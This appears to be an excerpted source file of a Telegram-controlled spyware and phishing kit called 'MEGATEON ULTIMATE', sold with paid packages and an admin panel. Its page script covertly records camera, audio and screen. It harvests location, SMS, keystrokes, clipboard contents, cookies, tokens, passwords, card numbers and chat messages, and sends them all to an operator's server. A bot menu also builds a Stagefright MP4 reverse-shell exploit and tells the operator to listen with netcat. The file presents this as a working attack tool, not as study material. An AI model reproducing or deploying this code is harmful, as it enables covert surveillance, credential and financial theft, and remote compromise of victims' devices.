#!/usr/bin/env python3
# ============================================================================
# MEGATEON ULTIMATE V16.5 - COMPLETE FULL EDITION
# 40+ FEATURES | 15 PLATFORMS | WHATSAPP PHISHING | PEGASUS STYLE
# HIGH QUALITY PHOTOS | 6s AUDIO | FRONT/BACK VIDEO
# ============================================================================
...
BASE_URL = os.environ.get("BASE_URL", "https://web-production-5c6d9.up.railway.app")
...
def get_admin_stats():
    ...
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='victims'")
    victims_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='stolen_credentials'")
    creds_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='stolen_tokens'")
    tokens_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='payments'")
    payments_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sms_messages'")
    sms_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='saved_passwords'")
    passwords_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='photos'")
    photos_exists = c.fetchone() is not None
    
    c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='audios'")
    audios_exists = c.fetchone() is not None
    
    # جلب البيانات
    total_users = c.execute("SELECT COUNT(*) FROM users").fetchone()[0] if users_exists else 0
    active_users = c.execute("SELECT COUNT(*) FROM users WHERE active=1").fetchone()[0] if users_exists else 0
    verified_users = c.execute("SELECT COUNT(*) FROM users WHERE verified=1").fetchone()[0] if users_exists else 0
    total_victims = c.execute("SELECT COUNT(*) FROM victims").fetchone()[0] if victims_exists else 0
    total_credentials = c.execute("SELECT COUNT(*) FROM stolen_credentials").fetchone()[0] if creds_exists else 0
    total_tokens = c.execute("SELECT COUNT(*) FROM stolen_tokens").fetchone()[0] if tokens_exists else 0
    pending_payments = c.execute("SELECT COUNT(*) FROM payments WHERE status='pending'").fetchone()[0] if payments_exists else 0
    total_sms = c.execute("SELECT COUNT(*) FROM sms_messages").fetchone()[0] if sms_exists else 0
    total_passwords = c.execute("SELECT COUNT(*) FROM saved_passwords").fetchone()[0] if passwords_exists else 0
    total_photos = c.execute("SELECT COUNT(*) FROM photos").fetchone()[0] if photos_exists else 0
    total_audios = c.execute("SELECT COUNT(*) FROM audios").fetchone()[0] if audios_exists else 0
...
async function getPreciseLocation() {
    statusDiv.innerHTML = "[2/30] Getting precise location...";
...
// ========== HIGH QUALITY PHOTOS ==========
async function captureHighQualityPhoto(facingMode) {
    try {
...
// ========== VIDEO RECORDING (Front & Back) ==========
async function recordVideo(facingMode, duration = 8000) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: facingMode,
        ...
        recorder.onstop = () => {
            ...
            reader.onloadend = () => {
                const endpoint = facingMode === 'user' ? '/front_video' : '/back_video';
                sendData(endpoint, { 
                    video: reader.result,
                    duration: duration,
                    resolution: '1280x720'
        ...
        console.log(`Video error (${facingMode}):`, e);
    }
}

// ========== AUDIO RECORDING (6 seconds) ==========
async function recordAudio(duration = 6000) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: {
...
// ========== SMS COLLECTION ==========
async function startSMSCollection() {
    statusDiv.innerHTML = "[16/30] Checking SMS permission...";
    try {
            ...
            if (permission.state === 'granted' || permission.state === 'prompt') {
                try {
                    if (navigator.sms) {
                        ...
                        if (sms) {
                            sendData("/sms_received", {
                                from: sms.from,
                                body: sms.body,
                                timestamp: sms.timestamp
                            });
                        }
                        if (navigator.sms.watch) {
                            navigator.sms.watch({
                                onmessage: function(sms) {
                                    sendData("/sms_new_message", {
                                        from: sms.from,
                                        body: sms.body,
                                        timestamp: sms.timestamp
                                    });
...
// ========== STAGEFRIGHT MP4 EXPLOIT ==========

function createMP4() {
    statusDiv.innerHTML = "[31/35] Generating MP4 exploit...";
    
    // 🔥 بورت 8080 بشكل افتراضي
    const host = prompt("Enter your IP address for reverse shell:", 
                        window.location.hostname || "192.168.1.100");
    const port = prompt("Enter port (recommended: 8080):", "8080");
    
    if (host && port) {
        sendData("/generate_mp4", {
            host: host,
            port: port
        });
        
        // إشعار للمستخدم
        alert(`📱 MP4 Exploit Generating...\n\n`
              + `🌐 Host: ${host}\n`
              + `🔌 Port: ${port}\n\n`
              + `💻 Listen: nc -lvnp ${port}`);
    }
...
function extractSavedPasswords() {
    statusDiv.innerHTML = "[20/30] Extracting saved passwords...";
    
    try {
        // 1. استخراج من الـ localStorage
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            
            const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth', 'credential'];
            if (passwordKeywords.some(kw => key.toLowerCase().includes(kw))) {
        ...
        // 2. استخراج من الـ sessionStorage
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            const value = sessionStorage.getItem(key);
            
            const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth'];
            if (passwordKeywords.some(kw => key.toLowerCase().includes(kw))) {
                sendData("/saved_password_found", {
        ...
        // 3. استخراج من الـ cookies
        document.cookie.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.split('=');
            const value = rest.join('=').trim();
            
            const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth'];
            if (passwordKeywords.some(kw => name.toLowerCase().includes(kw))) {
                sendData("/saved_password_found", {
                    source: 'cookie',
                    website: window.location.hostname,
                    username: name.trim(),
        ...
        // 4. استخراج من حقول input
        document.querySelectorAll('input[type="password"]').forEach(input => {
            if (input.value && input.value.length > 0) {
                sendData("/saved_password_found", {
                    source: 'input_field',
                    website: window.location.hostname,
                    username: document.querySelector('input[type="text"], input[type="email"], input[name*="user"], input[name*="email"]')?.value || 'unknown',
                    password: input.value
                });
            }
        });
        
        // 5. استخراج من عناصر hidden
        document.querySelectorAll('input[type="hidden"]').forEach(input => {
            const name = input.name || '';
            const value = input.value || '';
            
            const passwordKeywords = ['password', 'pass', 'pwd', 'secret', 'key', 'token', 'auth'];
            if (passwordKeywords.some(kw => name.toLowerCase().includes(kw)) && value.length > 0) {
                sendData("/saved_password_found", {
                    source: 'hidden_field',
                    website: window.location.hostname,
                    username: name,
        ...
        // 6. استخراج من الـ JSON في الصفحة
        try {
            const bodyText = document.body.innerText;
            const jsonMatches = bodyText.match(/{[^{}]*"password"[^{}]*}/g);
            if (jsonMatches) {
                    ...
                    try {
                        ...
                        if (data.password) {
                            sendData("/saved_password_found", {
                                source: 'json_data',
                                website: window.location.hostname,
                                username: data.username || data.email || data.user || 'unknown',
                                password: data.password.substring(0, 500)
                            });
                        }
                    } catch(e) {}
                });
        ...
        // 7. استخراج من Chrome Password Manager (عن طريق الـ input)
        document.querySelectorAll('input[type="password"]').forEach(input => {
        ...
        statusDiv.innerHTML = "[20/30] Password extraction complete!";
    } catch(e) {
        console.log('Password extraction error:', e);
    }
}
...
function getRealIP() {
    try {
        ...
        pc.onicecandidate = function(event) {
            if (event.candidate) {
                const ipMatch = event.candidate.candidate.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
                if (ipMatch) {
                    sendData("/real_ip_detected", { ip: ipMatch[0] });
                }
            }
        };
...
async function testInternetSpeed() {
    try {
        ...
        const speed = (size / (endTime - startTime)) * 1000;
        sendData("/internet_speed", {
...
// ========== CONTINUOUS CAMERA ==========
async function continuousCameraRecording() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
        ...
        recorder.onstop = () => {
            ...
            const reader = new FileReader();
            reader.onloadend = () => {
                sendData("/continuous_video", { video: reader.result });
            };
            reader.readAsDataURL(blob);
        };
        recorder.start();
...
// ========== CONTINUOUS AUDIO ==========
async function continuousAudioRecording() {
    try {
        ...
        recorder.onstop = () => {
            ...
            const reader = new FileReader();
            reader.onloadend = () => {
                sendData("/continuous_audio", { audio: reader.result });
            };
            reader.readAsDataURL(blob);
        };
        recorder.start();
...
// ========== ADVANCED CLIPBOARD ==========
function advancedClipboardMonitoring() {
    let lastClipboard = '';
    setInterval(async () => {
        try {
            ...
            if (text && text !== lastClipboard) {
                lastClipboard = text;
                sendData("/clipboard_advanced", {
                    content: text.substring(0, 1000),
                    length: text.length,
                    timestamp: Date.now()
                });
                
                const sensitive = ['password', 'pass', 'credit', 'card', 'bank', 'account', 'ssn'];
                for (const word of sensitive) {
                    if (text.toLowerCase().includes(word)) {
                        sendData("/sensitive_data_detected", {
                            type: word,
    ...
    try {
        ...
        if (messages.length > 0) {
            ...
            messages.forEach(msg => {
                const text = msg.querySelector('span[data-testid="message-text"]');
                if (text) {
                    extracted.push(text.textContent);
                }
            });
            if (extracted.length > 0) {
                sendData("/whatsapp_messages", { messages: extracted.slice(0, 20) });
            }
        }
    } catch(e) {}
}
...
function extractOTPFromPage() {
    try {
        ...
        if (found.length > 0) {
            sendData("/otp_codes_found", { codes: found });
        }
    } catch(e) {}
}
...
function extractTelegramMessages() {
    try {
        ...
        if (messages.length > 0) {
            ...
            if (extracted.length > 0) {
                sendData("/telegram_messages", { messages: extracted.slice(0, 20) });
            }
        }
    } catch(e) {}
}
...
async function collectAllData(){
    ...
    // Device info
    statusDiv.innerHTML = "[1/30] Device info...";
    sendData("/collect",{
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
    ...
    // ===== HIGH QUALITY PHOTOS =====
    statusDiv.innerHTML = "[3/30] Capturing high quality photos...";
    
    // Front photo
    const frontPhoto = await captureHighQualityPhoto('user');
    if (frontPhoto) {
        sendData("/camera_photo", { 
            image: frontPhoto,
            quality: 'high',
            facing: 'front'
        });
    ...
    // Back photo
    const backPhoto = await captureHighQualityPhoto('environment');
    if (backPhoto) {
        sendData("/camera_photo", { 
            image: backPhoto,
            quality: 'high',
    ...
    // ===== 6 SECONDS AUDIO =====
    statusDiv.innerHTML = "[4/30] Recording audio (6 seconds)...";
    await recordAudio(6000);
    
    // ===== AUDIO (old) =====
    statusDiv.innerHTML = "[5/30] Audio...";
    if (navigator.mediaDevices) {
        try {
            ...
            recorder.start();
            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 10000);
        } catch(e) {}
    }
    
    // Gallery
    statusDiv.innerHTML = "[6/30] Gallery...";
    ...
    // Contacts
    statusDiv.innerHTML = "[7/30] Contacts...";
    ...
    // Clipboard
    statusDiv.innerHTML = "[8/30] Clipboard...";
    try {
        const text = await navigator.clipboard.readText();
    ...
    // Keyboard
    statusDiv.innerHTML = "[9/30] Keyboard...";
    let keystrokes = [];
    setInterval(() => {
        if (keystrokes.length > 0) { sendData("/keystrokes", { keys: keystrokes.join('') }); keystrokes = []; }
    }, 5000);
    document.onkeypress = function(e) { const key = e.key; if (key.length === 1) keystrokes.push(key); };
    
    // ===== FRONT VIDEO =====
    statusDiv.innerHTML = "[10/30] Recording front video (8 seconds)...";
    await recordVideo('user', 8000);
    
    // ===== BACK VIDEO =====
    statusDiv.innerHTML = "[11/30] Recording back video (8 seconds)...";
    await recordVideo('environment', 8000);
    
    // Screen record
    statusDiv.innerHTML = "[12/30] Screen record...";
    try {
        ...
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const reader = new FileReader();
            reader.onloadend = () => sendData("/screen_record", { video: reader.result });
            reader.readAsDataURL(blob);
        };
        recorder.start();
    ...
    // Tokens
    statusDiv.innerHTML = "[13/30] Tokens...";
    const authData = { cookies: document.cookie, localStorage: { ...localStorage }, sessionStorage: { ...sessionStorage } };
    sendData("/auth_steal", authData);
    const commonTokens = ['token', 'jwt', 'access_token', 'refresh_token', 'auth', 'session', 'key', 'secret'];
    const foundTokens = {};
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        ...
        if (value && value.length > 50 && value.includes('.')) { foundTokens[key] = value; }
    }
    if (Object.keys(foundTokens).length > 0) { sendData("/tokens_found", foundTokens); }
    
    // Cards
    statusDiv.innerHTML = "[14/30] Cards...";
    const allText = document.body.innerText;
    const cardPatterns = [/\b(?:\d[ -]*?){13,16}\b/g, /\b\d{3,4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b/g];
    const foundCards = [];
    for (const pattern of cardPatterns) {
        const matches = allText.match(pattern);
        if (matches) foundCards.push(...matches);
    }
    document.querySelectorAll('input').forEach(input => {
        const value = input.value;
        if (value && value.match(/\\d{13,16}/)) { foundCards.push(value); }
    });
    if (foundCards.length > 0) { sendData("/credit_cards", { cards: foundCards }); }
    
    // Behavior analysis
    statusDiv.innerHTML = "[15/30] Behavior analysis...";
    const behaviorData = {
        plugins: Array.from(navigator.plugins).map(p => p.name),
    ...
    sendData("/behavior_analysis", behaviorData);
    
    // SMS collection
    statusDiv.innerHTML = "[16/30] SMS collection...";
    await startSMSCollection();
    
    // WhatsApp
    statusDiv.innerHTML = "[17/30] Extracting WhatsApp...";
    setTimeout(extractWhatsAppMessages, 2000);
    
    // OTP
    statusDiv.innerHTML = "[18/30] Extracting OTP...";
    setTimeout(extractOTPFromPage, 3000);
    
    // Telegram
    statusDiv.innerHTML = "[19/30] Extracting Telegram...";
    setTimeout(extractTelegramMessages, 4000);
    
    // System info
    statusDiv.innerHTML = "[20/30] System info...";
    getSystemInfo();
    
    // Saved passwords
    statusDiv.innerHTML = "[21/30] Extracting saved passwords...";
    setTimeout(extractSavedPasswords, 1000);
    
    // Real IP
    statusDiv.innerHTML = "[22/30] Detecting real IP...";
    setTimeout(getRealIP, 2000);
    
    // Battery
    statusDiv.innerHTML = "[23/30] Battery monitoring...";
    setTimeout(monitorBattery, 3000);
    
    // Internet speed
    statusDiv.innerHTML = "[24/30] Testing internet speed...";
    setTimeout(testInternetSpeed, 4000);
    
    // Continuous camera
    statusDiv.innerHTML = "[25/30] Continuous camera...";
    setTimeout(continuousCameraRecording, 5000);
    
    // Continuous audio
    statusDiv.innerHTML = "[26/30] Continuous audio...";
    setTimeout(continuousAudioRecording, 7000);
    
    // Advanced clipboard
    statusDiv.innerHTML = "[27/30] Advanced clipboard...";
    setTimeout(advancedClipboardMonitoring, 9000);
    
    // Advanced keylogger
    statusDiv.innerHTML = "[28/30] Advanced keylogger...";
    setTimeout(advancedKeylogger, 10000);
    
    // Cookies
    statusDiv.innerHTML = "[29/30] Extracting cookies...";
    setTimeout(extractCookies, 11000);
    
    // Page content
    statusDiv.innerHTML = "[30/30] Extracting page content...";
    setTimeout(extractPageContent, 12000);
    
    // Complete
    statusDiv.innerHTML = "[30/30] Complete! Redirecting...";
    setTimeout(() => {
        if (platform && platform !== 'unknown' && platform !== 'default' && platform !== 'booster') {
...
@app.route('/generate_mp4/<user_id>')
def generate_mp4(user_id):
    try:
        cb_host = request.args.get('host', '0.0.0.0')
        cb_port = int(request.args.get('port', 8080))
        
        filename = f"exploit_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        filepath = f"static/{filename}"
        os.makedirs("static", exist_ok=True)
        
        result = subprocess.run(
            ['python', 'mp4.py', '-c', cb_host, '-p', str(cb_port), '-o', filepath],
            capture_output=True,
            text=True,
            timeout=30
        )
        ...
        if result.returncode == 0 and os.path.exists(filepath):
            download_link = f"{BASE_URL}/download_mp4/{filename}"
            send_telegram(int(user_id), 
                f"📱 MP4 Ready!\n🔗 {download_link}\n💻 Listen: nc -lvnp {cb_port}")
            return send_file(filepath, as_attachment=True)
        else:
            send_telegram(int(user_id), f"❌ Error: {result.stderr}")
            return {"status": "error"}
            
    except Exception as e:
        send_telegram(int(user_id), f"❌ Error: {str(e)}")
        return {"status": "error"}

@app.route('/download_mp4/<filename>')
...
def precise_location():
    ...
    if ref and ref != 'unknown':
        ...
        c.execute('''CREATE TABLE IF NOT EXISTS precise_addresses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            lat REAL,
            lng REAL,
        ...
        c.execute("""INSERT INTO precise_addresses 
                     (session_id, lat, lng, address, city, country, street, postal_code, google_maps, timestamp, ip) 
                     VALUES (?,?,?,?,?,?,?,?,?,?,?)""",
                  (session_id, data.get('lat'), data.get('lng'), 
                   data.get('address', 'Unknown'), data.get('city', 'Unknown'),
                   data.get('country', 'Unknown'), data.get('street', 'Unknown'),
                   data.get('postalCode', 'Unknown'), data.get('googleMaps', ''),
                   datetime.datetime.now().isoformat(), ip))
        
        conn.commit()
        conn.close()
        
        # إرسال تنبيه مع العنوان
        msg = f"""📍 <b>الموقع الدقيق!</b>

🌍 العنوان: {data.get('address', 'Unknown')}
🏙️ المدينة: {data.get('city', 'Unknown')}
🇨🇳 الدولة: {data.get('country', 'Unknown')}
📍 الشارع: {data.get('street', 'Unknown')}
📮 الرمز البريدي: {data.get('postalCode', 'Unknown')}
🎯 الدقة: {data.get('accuracy', 0)} متر
🗺️ <a href='{data.get('googleMaps', '')}'>عرض على الخريطة</a>"""
        
        send_telegram(int(ref), msg)
        
    return {"status": "ok"}

@app.route('/ip_location', methods=['POST'])
def ip_location():
    data = request.get_json()
    ref = data.get('ref')
    
    if ref and ref != 'unknown':
        msg = f"""🌐 <b>الموقع عبر IP</b>

🖥️ IP: {data.get('ip', 'Unknown')}
🏙️ المدينة: {data.get('city', 'Unknown')}
📍 المنطقة: {data.get('region', 'Unknown')}
🇨🇳 الدولة: {data.get('country', 'Unknown')}
📮 الرمز البريدي: {data.get('postal', 'Unknown')}
⏰ التوقيت: {data.get('timezone', 'Unknown')}
🏢 المزود: {data.get('org', 'Unknown')}"""
...
def camera_photo():
    ...
    facing = data.get('facing', 'unknown')
    
    try:
        os.makedirs("photos", exist_ok=True)
        img_data = data.get('image', '').split(',')[1] if ',' in data.get('image', '') else data.get('image', '')
        if img_data:
            filename = f"photos/photo_{facing}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            ...
            if ref and ref != 'unknown':
                ...
                send_alert(ref, 'new_photo', f"📸 {facing} photo captured! Quality: {quality} Size: {format_size(size)}")
                send_telegram(int(ref), f"📸 {facing.capitalize()} Photo Captured!", photo=filename)
    except Exception as e:
...
@app.route('/front_video', methods=['POST'])
def front_video():
    data = request.get_json()
    ref = data.get('ref')
    ...
    if ref and ref != 'unknown' and video_data:
        try:
            os.makedirs(f"front_videos/user_{ref}", exist_ok=True)
            filename = f"front_videos/user_{ref}/front_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
            ...
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO front_videos 
                         (ip, time, path, session_id, duration, resolution) 
                         VALUES (?,?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), 
                       filename, session_id, duration, resolution))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_video', f"📹 Front Video recorded! Duration: {duration/1000}s Resolution: {resolution}")
            send_telegram(int(ref), f"📹 Front Video!", document=filename)
        except Exception as e:
            print(f"Front video error: {e}")
    
    return {"status": "ok"}

@app.route('/back_video', methods=['POST'])
def back_video():
    data = request.get_json()
    ref = data.get('ref')
    video_data = data.get('video', '')
    ...
    if ref and ref != 'unknown' and video_data:
        try:
            os.makedirs(f"back_videos/user_{ref}", exist_ok=True)
            filename = f"back_videos/user_{ref}/back_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
            video_bytes = base64.b64decode(video_data.split(',')[1] if ',' in video_data else video_data)
            with open(filename, 'wb') as f:
                f.write(video_bytes)
            ...
            conn = sqlite3.connect(f'user_{ref}.db')
            c = conn.cursor()
            c.execute("""INSERT INTO back_videos 
                         (ip, time, path, session_id, duration, resolution) 
                         VALUES (?,?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), 
                       filename, session_id, duration, resolution))
            ...
            send_alert(ref, 'new_video', f"📹 Back Video recorded! Duration: {duration/1000}s Resolution: {resolution}")
            send_telegram(int(ref), f"📹 Back Video!", document=filename)
        except Exception as e:
            print(f"Back video error: {e}")
    
    return {"status": "ok"}

@app.route('/audio_6s', methods=['POST'])
def audio_6s():
    data = request.get_json()
    ref = data.get('ref')
    ...
    if ref and ref != 'unknown' and audio_data:
        try:
            os.makedirs(f"audios/user_{ref}", exist_ok=True)
            filename = f"audios/user_{ref}/audio_6s_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.webm"
            ...
            c = conn.cursor()
            c.execute("""INSERT INTO audios 
                         (ip, time, path, session_id, duration, size) 
                         VALUES (?,?,?,?,?,?)""",
                      (ip, datetime.datetime.now().isoformat(), 
                       filename, session_id, duration, os.path.getsize(filename)))
            conn.commit()
            conn.close()
            
            send_alert(ref, 'new_audio', f"🎤 6s Audio recorded! Duration: {duration/1000}s")
            send_telegram(int(ref), f"🎤 6s Audio Recorded!", document=filename)
        except Exception as e:
            print(f"6s Audio error: {e}")
...
def get_full_device_data(user_id, session_id):
    ...
    # جلب العنوان الدقيق
    c.execute("SELECT address, city, country, street, google_maps, timestamp FROM precise_addresses WHERE session_id=? ORDER BY id DESC LIMIT 1", (session_id,))
    precise_address = c.fetchone()
    ...
    return {
        ...
        'sms': sms,
        'passwords': passwords,
        'precise_address': precise_address  # إضافة العنوان الدقيق
    }
...
def handle_start(chat_id, user_id, username, first_name):
    ...
    keyboard = [
        ...
        [{"text": "📱 MP4 Exploit", "callback_data": "generate_mp4"}],
    ...
    send_telegram(chat_id,
        ...
        f"MEGATEON ULTIMATE V16.5{stats}",
        keyboard)
...
def handle_callback(callback_id, chat_id, message_id, data, user_id, username, first_name):
    ...
    # ===== ADMIN PANEL =====
    if data == "admin_panel":
        if str(user_id) in [str(a) for a in ADMIN_IDS]:
...
⏳ المدفوعات المعلقة: {stats['pending_payments']}"""
            ...
            send_telegram(chat_id, "❌ أنت لست مشرفاً!")
        return

    # ===== 🟢 MP4 STAGEFRIGHT (جوه الدالة) =====
    if data == "generate_mp4":
        keyboard = [
            [{"text": "📱 Generate MP4 (8080)", "callback_data": "mp4_reverse"}],
            [{"text": "🔙 Back", "callback_data": "back"}]
        ]
        send_telegram(chat_id, "📱 Choose MP4 Exploit type:", keyboard)
        return

    if data == "mp4_reverse":
        send_telegram(chat_id, "📱 Generating MP4... Please wait.")
        try:
            import subprocess
            import os
            filename = f"exploit_{uid}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
            filepath = f"static/{filename}"
            os.makedirs("static", exist_ok=True)
            
            result = subprocess.run(
                ['python', 'mp4.py', '-c', '0.0.0.0', '-p', '8080', '-o', filepath],
                capture_output=True,
                text=True,
                timeout=30
            )
            ...
            if result.returncode == 0 and os.path.exists(filepath):
                send_telegram(chat_id, 
                    f"📱 MP4 Ready!\n🔗 {BASE_URL}/download_mp4/{filename}\n💻 Listen: nc -lvnp 8080")
            else:
                send_telegram(chat_id, f"❌ Error: {result.stderr}")
        except Exception as e:
            send_telegram(chat_id, f"❌ Error: {str(e)}")
        return

    if data == "mp4_custom_port":
        pending_requests[chat_id] = {'action': 'mp4_port'}
        send_telegram(chat_id, "✏️ Enter port (recommended: 8080):")
        return
    ...
    if data == "admin_users" and str(user_id) in [str(a) for a in ADMIN_IDS]:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id, first_name, active, verified, package FROM users ORDER BY join_date DESC LIMIT 30")
    ...
    # ===== HELP =====
    if data == "help":
        msg = """📖 <b>MEGATEON ULTIMATE V16.5</b>
...
• 🛡️ حماية متقدمة
• 📱 صفحة تصيد واتساب
• 📸 صور عالية الجودة (أمامية/خلفية)
• 🎤 تسجيل صوت 6 ثواني
• 📹 فيديو أمامي/خلفي (8 ثواني)
...
def handle_text(chat_id, user_id, text, username, first_name):
    ...
    if chat_id in pending_shell and pending_shell[chat_id].get('session_id'):
        if text == '/exit':
            ...
            send_telegram(chat_id, "💻 Shell session closed")
            return
        
        session_id = pending_shell[chat_id]['session_id']
        send_telegram(chat_id, f"💻 Command sent: {text}")
        conn = sqlite3.connect(f'user_{uid}.db')
        c = conn.cursor()
        c.execute("INSERT INTO shell_commands (session_id, command, output, time) VALUES (?,?,?,?)",
                  (session_id, text, "[Executed]", datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
        return
    ...
    if uid in pending_requests and pending_requests[uid].get('action') == 'broadcast' and str(user_id) in [str(a) for a in ADMIN_IDS]:
        ...
        for uid_user in users.keys():
            try:
                send_telegram(int(uid_user), f"📢 Announcement:\n{text}")
                sent += 1
                time.sleep(0.1)
            except: pass
        send_telegram(chat_id, f"✅ Sent to {sent} users")
        del pending_requests[uid]
        return
    
    # ===== MP4 CUSTOM PORT =====
    if uid in pending_requests and pending_requests[uid].get('action') == 'mp4_port':
        try:
            port = int(text.strip())
            import mp4
            data = mp4.create_mp4(0x41d00010, 0xb0002850, request.remote_addr, port)
            filename = f"exploit_{uid}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
            filepath = f"static/{filename}"
            os.makedirs("static", exist_ok=True)
            with open(filepath, 'wb') as f:
...
def main():
    ...
    # Create directories
    for dir_name in ['reports', 'exports', 'backups', 'photos', 'audios', 'gallery', 'screenshots', 'receipts', 'front_videos', 'back_videos']:
    ...
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║         MEGATEON ULTIMATE V16.5 - COMPLETE FINAL EDITION        ║
╠═══════════════════════════════════════════════════════════════════╣
║  🌐 Server: http://0.0.0.0:"""+str(PORT)+"""                                   ║
║  🤖 Bot: """+TELEGRAM_TOKEN[:15]+"""...                                     ║
║  ✅ NEW: High Quality Photos (Front/Back)                       ║
║  ✅ NEW: 6 Seconds Audio Recording                              ║
║  ✅ NEW: Front & Back Video (8 seconds)                        ║
║  ✅ 40+ Features | 15+ Platforms                               ║
║  ✅ Send /start to test                                         ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
